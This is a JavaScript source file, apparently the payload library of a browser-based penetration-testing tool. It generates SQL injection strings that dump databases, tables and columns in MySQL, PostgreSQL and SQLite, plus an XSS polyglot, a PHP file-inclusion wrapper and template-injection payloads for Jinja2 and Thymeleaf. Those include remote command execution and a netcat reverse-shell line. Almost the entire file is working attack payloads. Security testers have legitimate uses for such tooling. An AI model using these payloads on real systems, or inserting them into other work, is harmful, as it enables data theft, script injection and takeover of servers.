window.Payload = {}

window.Payload.SQLi = {
  spaceToComment: value => value.replace(/[^\S\r\n]+/g, '/**/'),

  polyglot: value => "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",

  MySQL: {
    unionSelect: ({ columns, position }) => {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return 'union select ' +
        Array.from(Array(columns + 1).keys()).slice(1).join(',')
    },

    dumpDatabases: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(schema_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.schemata'
    },

    dumpTables: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(table_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.tables where table_schema=database()'
    },

    dumpColumns: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(column_name)'

      return 'union select ' + fields.join(',') +
        ' from information_schema.columns where table_schema=database()'
    },

    // PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/
    dumpInOneShot: value => "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)",

    dumpCurrentQueries: value => '(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a)',

    errorBased: ({ columns, position }) => {
      return 'extractvalue(0x0a,concat(0x0a,(select database())))'
    }
  },

  PostgreSQL: {
    unionSelect: ({ columns, position }) => {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return 'union select ' + Array(columns).fill('null').join(',')
    },

    dumpDatabases: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(datname, ',')"

      return 'union select ' + fields.join(',') + ' from pg_database'
    },

    dumpTables: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(tablename, ',')"

      return ' union select ' + fields.join(',') +
        " from pg_tables where schemaname='public'"
    },

    dumpColumns: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array(columns).fill('null')
      fields[position - 1] = "string_agg(column_name, ',')"

      return 'union select ' + fields.join(',') +
        " from information_schema.columns where table_schema='public'"
    },

    errorBased: ({ columns, position }) => {
      return 'cast(version() as int)'
    }
  },
  SQLite: {
    unionSelect: ({ columns, position }) => {
      columns = parseInt(columns)
      if (isNaN(columns) === true) {
        return ''
      }

      return 'union select ' +
        Array.from(Array(columns + 1).keys()).slice(1).join(',')
    },

    dumpTables: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(name)'

      return 'union select ' + fields.join(',') +
        " from sqlite_master WHERE type='table'"
    },

    dumpColumns: ({ columns, position }) => {
      columns = parseInt(columns)
      position = parseInt(position)
      if (isNaN(columns) === true || isNaN(position) === true ||
          position > columns) {
        return ''
      }

      const fields = Array.from(Array(columns + 1).keys()).slice(1)
      fields[position - 1] = 'group_concat(sql)'

      return 'union select ' + fields.join(',') +
        " from sqlite_master WHERE type='table'"
    }
  }
}

window.Payload.XSS = {
  polyglot: value => "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
}

window.Payload.LFI = {
  phpWrapperBas64: value => 'php://filter/convert.base64-encode/resource=' + value
}

window.Payload.SSTI = {
  Jinja2: {
    tuple2Class: value => '{{().__class__.__base__.__subclasses__()}}',
    string2Class: value => "{{''.__class__.mro()[1].__subclasses__()}}",
    list2Class: value => '{{[].__class__.__base__.__subclasses__()}}',
    method2Global: value => '{{foo.__init__.__globals__}}',
    // Reference: https://twitter.com/realgam3/status/1184747565415358469
    flaskRCE: value => "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
    // TODO: add features to bypass filter keywords like __ '' "" []
  },
  Java: {
    thymeleafRCE: value => '__${T(java.lang.Runtime).getRuntime().exec("nc ip port -e sh")}__::.x',
    commonRCE: value => "${T(java.lang.Runtime).getRuntime().exec('ls')}"
  }
}
